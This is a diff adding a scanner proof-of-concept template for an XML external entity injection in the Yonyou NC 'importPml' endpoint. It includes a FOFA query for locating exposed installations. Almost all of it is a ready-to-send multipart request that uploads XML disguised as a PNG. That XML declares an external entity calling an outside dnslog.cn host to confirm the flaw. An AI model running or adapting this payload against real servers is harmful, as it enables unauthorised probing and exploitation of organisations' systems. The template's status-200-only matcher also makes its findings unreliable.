@@ -1,0 +1,19 @@
+id: poc-zc44d33ug18h6cay
+info:
+  name: 用友NC importPml存在XML注入漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/zc44d33ug18h6cay'
+  tags: other,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: zc44d33ug18h6cay
+    fofa: app="用友-UFIDA-NC"
+http:
+- raw:
+  - "POST /portal/pt/portalpage/importPml?pageId=login HTTP/1.1\nHost: {{Hostname}}\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundarybXJ4bi5uZXQ\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.66 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\n\n------WebKitFormBoundarybXJ4bi5uZXQ\nContent-Disposition: form-data; name=\"file\"; filename=\"1.png\"\n\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE root [\n  <!ENTITY xxe SYSTEM \"http://xxe.f87a63.dnslog.cn\">\n]>\n<root>\n  <TextResult>&xxe;</TextResult>\n</root>\n------WebKitFormBoundarybXJ4bi5uZXQ--"
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
